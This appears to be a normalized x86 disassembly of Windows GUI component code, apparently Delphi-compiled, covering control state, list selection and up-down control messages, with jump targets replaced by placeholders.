cmp [ eax + 0x2e2 ] 0x0
jne r-xdata
xor eax eax
cmp [ eax + 0x29a ] 0x0
jne r-xdata
retn
xor eax eax
retn
cmp [ eax + 0x2da ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2a2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2a2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x29a ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2e2 ] 0x0
jne r-xdata
cmp [ eax + 0x2a2 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_43c6e0
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
cmp [ esi + 0x2da ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x2dc ]
call [ esi + 0x2d8 ]
sub_43c738
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x7 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2a2 ] 0x0
je r-xdata
cmp [ esi + 0x2e2 ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov ax [ ebp - 0x6 ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2a4 ]
call [ esi + 0x2a0 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2e4 ]
call [ esi + 0x2e0 ]
sub_43c7b4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ esi + 0x278 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x1
jl r-xdata
test bl bl
jne r-xdata
mov edx edi
mov eax esi
call sub_43cb58
dec edi
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_43b1bc
sub_43c7ec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x275 ] 0x1
je r-xdata
mov edx esi
mov eax ebx
call sub_43cbcc
mov eax ebx
call sub_43b174
cmp esi eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_418304
cmp eax 0xffffffff
je r-xdata
test esi esi
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_43cb80
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_43cb58
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43b1bc
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
sub_43c894
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
test [ ebp - 0x5 ] 0x8
je r-xdata
xor edx edx
push ebp
push sub_43ca6c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0x1
test [ ebp - 0x5 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x280 ] edx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43cbcc
test esi esi
je r-xdata
test [ ebp - 0x5 ] 0x1
je r-xdata
test [ ebp - 0x5 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_418304
inc eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43c7ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43cbcc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
xor edx edx
call sub_4182a8
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43cf1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0x0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_439eec
mov ebx eax
mov eax ebx
call sub_439750
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43ca88
mov edx [ ebp - 0x4 ]
mov [ edx + 0x280 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_418444
xor ecx ecx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43cb80
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4392f8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_4392f8
cmp ebx eax
jl r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_43915c
mov ebx eax
test [ ebp - 0x5 ] 0x4
je r-xdata
mov al 0x1
mov eax ebx
call sub_439068
test al al
je r-xdata
push 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43cca0
jmp r-xdata
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43c850
jmp r-xdata
mov eax ebx
call sub_43915c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] ebx
jmp r-xdata
sub_43caa0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x278 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43ca88
mov ecx esp
xor edx edx
call sub_439780
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_453e1c
push eax
call InvalidateRect
inc edi
dec esi
jne r-xdata
sub_43caec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov edi [ ebp + 0xc ]
test bl bl
jne r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44ebfc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0x285 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43afb0
test al 0x8
je r-xdata
mov [ esi + 0x285 ] 0x0
jmp r-xdata
mov eax esi
call sub_43cf1c
mov eax esi
call sub_43b174
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_43c894
jmp r-xdata
sub_43cb58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ca88
xor edx edx
call sub_438f84
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_418198
pop esi
pop ebx
retn
sub_43cb80
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov edx ecx
mov eax [ eax + 0x278 ]
mov ecx ebx
call sub_418324
mov dl 0x1
mov eax ebx
call sub_438f84
sub_43cba8
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov cl [ r-xdata ]
or cl [ esp ]
mov edx esi
mov eax ebx
call sub_43c894
pop edx
pop esi
pop ebx
retn
sub_43cbcc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x278 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax esi
call sub_43b174
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_43ca88
cmp edi eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_43cb58
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_43b1bc
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax [ esi + 0x278 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor ecx ecx
mov edx edi
mov eax esi
call sub_43cb80
sub_43cc44
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x274 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0x274 ] bl
mov eax esi
call sub_43cf1c
mov eax esi
call sub_43b174
mov edx eax
mov eax esi
call sub_43cbcc
sub_43cc78
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x275 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x275 ] al
mov eax ebx
call sub_43cf1c
sub_43cca0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cbcc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
test [ ebx + 0x275 ] 0x2
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43ce65
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi [ ebp - 0x4 ]
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
push 0x0
mov edx [ ebx + 0x278 ]
mov cl 0x4
mov eax [ ebp - 0xc ]
call sub_418514
mov eax [ ebp - 0xc ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebx + 0x278 ]
mov cl 0x4
mov eax [ ebp - 0x10 ]
call sub_418514
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41814c
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebx + 0x278 ]
mov edx [ ebp - 0x4 ]
call sub_418304
mov esi eax
test esi esi
jle r-xdata
inc edi
xor esi esi
mov eax [ ebx + 0x278 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
test [ ebx + 0x275 ] 0x4
je r-xdata
test [ ebx + 0x275 ] 0x4
je r-xdata
inc esi
jne r-xdata
mov eax [ ebx + 0x278 ]
mov edx esi
call sub_418198
mov eax [ ebx + 0x278 ]
mov ecx [ ebp - 0x4 ]
xor edx edx
call sub_418324
jmp r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4182a8
mov edx eax
xor ecx ecx
mov eax ebx
call sub_43cb80
inc esi
dec edi
jne r-xdata
mov eax [ ebx + 0x278 ]
mov edx esi
call sub_4182a8
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418304
inc eax
je r-xdata
mov eax esi
call sub_439250
mov esi eax
mov eax esi
call sub_43915c
mov esi eax
jmp r-xdata
mov eax esi
call sub_4392c8
mov esi eax
jmp r-xdata
mov eax esi
call sub_4391a0
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403174
mov eax [ ebp - 0xc ]
call sub_403174
retn
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cb80
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cb58
test esi esi
jne r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41814c
jmp r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
sub_43ce80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_43cf0f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x274 ] 0x0
jne r-xdata
test esi esi
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cf16
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x278 ]
call sub_418304
inc eax
jne r-xdata
test bl bl
je r-xdata
mov ecx 0x1
mov edx esi
mov eax edi
call sub_43cb80
mov eax edi
call sub_43cf1c
sub_43cf1c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax [ ebx + 0x278 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43ca88
mov ebp eax
mov eax [ ebx + 0x278 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax ebx
call sub_43ca88
mov edi eax
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cb58
jmp r-xdata
test esi esi
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ ebx + 0x275 ] 0x4
je r-xdata
cmp [ ebx + 0x274 ] 0x0
je r-xdata
test [ ebx + 0x275 ] 0x8
je r-xdata
mov eax edi
call sub_439750
test al al
je r-xdata
mov eax edi
call sub_438edc
test al al
jne r-xdata
mov eax edi
call sub_4390a8
push eax
mov eax ebp
call sub_4390a8
pop edx
cmp edx eax
je r-xdata
mov dl 0x1
mov eax edi
call sub_438f84
sub_43cfc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_43d032
push [ fs : edx ]
mov [ fs : edx ] esp
test esi esi
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d039
mov eax [ ebp - 0x4 ]
call sub_403174
retn
inc esi
add ebx 0x4
dec esi
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41814c
mov eax [ ebx ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
sub_43d040
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43d1b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov edx ebx
mov eax esi
call sub_4182a8
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43cf1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x278 ]
mov cl 0x4
mov eax [ ebp - 0xc ]
call sub_418514
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor edx edx
mov eax esi
call sub_4182a8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_43b174
cmp ebx eax
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_418198
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
mov cl 0x4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418514
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor edx edx
mov eax esi
call sub_4182a8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b1bc
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
xor ecx ecx
mov edx esi
call sub_418514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403174
mov eax [ ebp - 0x8 ]
call sub_403174
retn
inc edi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx ebx
call sub_4182a8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418304
inc eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4182a8
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43cb80
inc ebx
dec edi
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cb58
sub_43d1cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_418304
inc eax
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43c7ec
sub_43d1f0
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
test ebx ebx
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418304
inc eax
jne r-xdata
mov eax ebx
call sub_4390a8
mov ebx eax
test ebx ebx
jne r-xdata
sub_43d220
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax esi
call sub_4390e4
mov ebx eax
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d1f0
pop ecx
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_439120
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_4390e4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d1f0
pop ecx
test al al
je r-xdata
mov eax ebx
call sub_439120
mov ebx eax
test ebx ebx
jne r-xdata
sub_43d288
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d302
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d314
mov ebx eax
mov [ ebp - 0x8 ] ebx
jmp r-xdata
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d309
mov eax [ ebp - 0x4 ]
call sub_403174
retn
mov eax ebx
call sub_438edc
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_43d220
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax ebx
call sub_4390a8
mov ebx eax
mov [ ebp - 0x8 ] ebx
sub_43d314
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax edi
call sub_43ca7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_43b174
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_43ca88
mov edx eax
mov eax ebp
call sub_41814c
inc esi
dec ebx
jne r-xdata
sub_43d380
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44fb48
push 0x2
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_44cdf0
push 0x14
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_44ce14
mov eax [ ebx + 0x4c ]
mov edx eax
sar eax 0x1
jns r-xdata
add esp 0xfffffff0
call sub_4034c0
add edx eax
mov eax ebx
call sub_44ce14
mov [ ebx + 0x208 ] 0x1
mov [ ebx + 0x21f ] 0x0
mov [ ebx + 0x21c ] 0x0
mov [ ebx + 0x210 ] 0x0
mov [ ebx + 0x212 ] 0x64
mov [ ebx + 0x214 ] 0x1
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x229 ] 0x1
mov [ ebx + 0x21e ] 0x1
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
adc eax 0x0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_43d44c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x10
call sub_4370a4
mov edx ebx
mov eax esi
call sub_450ca8
or [ ebx + 0x4 ] 0x2
cmp [ esi + 0x228 ] 0x1
jne r-xdata
or [ ebx + 0x4 ] 0x8
or [ ebx + 0x4 ] 0x4
jmp r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x40
cmp [ esi + 0x229 ] 0x0
jne r-xdata
cmp [ esi + 0x21e ] 0x0
jne r-xdata
or [ ebx + 0x4 ] 0x20
cmp [ esi + 0x21f ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x80
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_450bd4
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
or [ ebx + 0x4 ] 0x1
sub_43d4e0
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
call sub_450dd4
mov eax [ ebx + 0x20c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44cdf0
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406a38
push eax
push 0x0
push 0x465
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406a38
push eax
push 0x0
push 0x467
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov eax [ ebx + 0x214 ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_43da04
push 0x0
mov eax [ ebx + 0x20c ]
call sub_453e1c
push eax
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_43d5b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_403370
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_403370
sub_43d610
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_452408
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_453e1c
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43d640
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_403370
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_403370
sub_43d6b4
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x1
xor ebx ebx
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x210 ]
jge r-xdata
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x212 ]
jle r-xdata
cmp [ esi + 0x21a ] 0x0
jl r-xdata
mov ax [ esi + 0x21a ]
test ax ax
jge r-xdata
cmp [ esi + 0x21a ] 0x0
jle r-xdata
xor ebx ebx
jmp r-xdata
test ax ax
jle r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esi + 0x232 ] 0x0
je r-xdata
mov bl 0x1
cmp [ esi + 0x23a ] 0x0
je r-xdata
mov ecx esp
mov edx esi
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
mov ax [ esi + 0x218 ]
push eax
push ebx
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_43d770
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x8 ] 0xfffffd2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dx [ esi + 0xc ]
mov bp [ esi + 0x10 ]
add dx bp
mov ecx ebp
mov eax edi
call sub_43d698
xor al 0x1
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
sub_43d7c8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x1
test edi edi
je r-xdata
xor ebx ebx
mov edx esi
mov eax edi
call sub_4030d8
test al al
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403100
mov edi eax
test edi edi
jne r-xdata
sub_43d7f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d9d6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_450b4c
dec eax
test eax eax
jl r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d9dd
lea eax [ ebp - 0x18 ]
call sub_403eec
retn
mov eax [ esi + 0x30 ]
cmp eax [ ebx + 0x30 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x20c ] eax
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_450b10
cmp ebx eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_450b10
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_450b10
cmp esi [ eax + 0x20c ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_450b10
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
